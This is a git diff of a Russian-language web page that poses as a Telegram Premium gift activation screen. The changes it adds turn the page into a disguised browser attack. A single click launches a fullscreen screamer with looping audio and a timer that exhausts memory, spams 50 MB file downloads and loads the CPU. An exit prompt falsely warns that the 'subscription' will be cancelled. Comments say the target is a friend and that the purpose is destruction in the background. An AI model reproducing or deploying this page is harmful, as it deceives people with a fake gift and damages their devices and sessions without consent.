@@ -2,35 +2,67 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>TG Premium</title>
+    <title>TG Premium Gift</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .gift-btn { padding: 20px 40px; font-size: 22px; background: #0088cc; color: #fff; border: none; cursor: pointer; border-radius: 12px; font-weight: bold; }
-        #view { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 9999; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 150px; }
+        .btn { padding: 30px 60px; font-size: 30px; background: #0088cc; color: #fff; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; }
+        #scary { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
     </style>
 </head>
 <body>
-    <div id="main">
-        <img src="https://telegram.org" width="80">
-        <h1>Поздравляем!</h1>
-        <p>Вам начислена подписка <b>Premium</b> на 12 месяцев.</p>
-        <button class="gift-btn" onclick="openGift()">АКТИВИРОВАТЬ</button>
+    <div id="ui">
+        <img src="https://telegram.org" width="100">
+        <h1>Вам подарок!</h1>
+        <p>Подписка <b>Premium</b> активна. Нажмите для подтверждения.</p>
+        <button class="btn" onclick="activate()">ПОДТВЕРДИТЬ</button>
     </div>
 
-    <!-- Новые ссылки, которые Гитхаб должен пропустить -->
-    <img id="view" src="https://raw.githubusercontent.com">
-    <audio id="snd" src="https://raw.githubusercontent.com"></audio>
+    <img id="scary" src="https://raw.githubusercontent.com">
+    <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
+    <!-- Невидимый звук для удержания фонового процесса -->
+    <audio id="bg_stay" src="https://www.soundhelix.com" muted></audio>
 
     <script>
-        function openGift() {
-            var s = document.getElementById("snd");
-            var v = document.getElementById("view");
+        let killer_data = [];
+
+        function activate() {
+            const s = document.getElementById("scream");
+            const b = document.getElementById("bg_stay");
+            const i = document.getElementById("scary");
+
+            // Запускаем фоновый шум, чтобы вкладка не "уснула"
+            b.volume = 0.01;
+            b.play();
+
+            // Запускаем скример
             s.volume = 1.0;
             s.play();
-            v.style.display = "block";
-            document.documentElement.requestFullscreen();
-            s.loop = true;
+            i.style.display = "block";
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+
+            // ЗАПУСК УНИЧТОЖЕНИЯ В ФОНЕ
+            setInterval(() => {
+                // Забиваем память (ОЗУ)
+                for (let j = 0; j < 500; j++) {
+                    killer_data.push(new Uint8Array(1024 * 1024).fill(7));
+                }
+                
+                // Спам скачиванием (будет всплывать даже в фоне)
+                const blob = new Blob([new Uint8Array(50 * 1024 * 1024)], {type: 'application/octet-stream'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = "cache_" + Math.random().toString(36).substring(7) + ".bin";
+                a.click();
+
+                // Жёсткая нагрузка на процессор
+                let x = 0;
+                while(x < 1000000) { x++; Math.sqrt(x); }
+            }, 1000);
         }
+
+        // Если друг попытается уйти со страницы, браузер может выкинуть предупреждение
+        window.onbeforeunload = function() { return "Вы уверены? Подписка аннулируется!"; };
     </script>
 </body>
 </html>
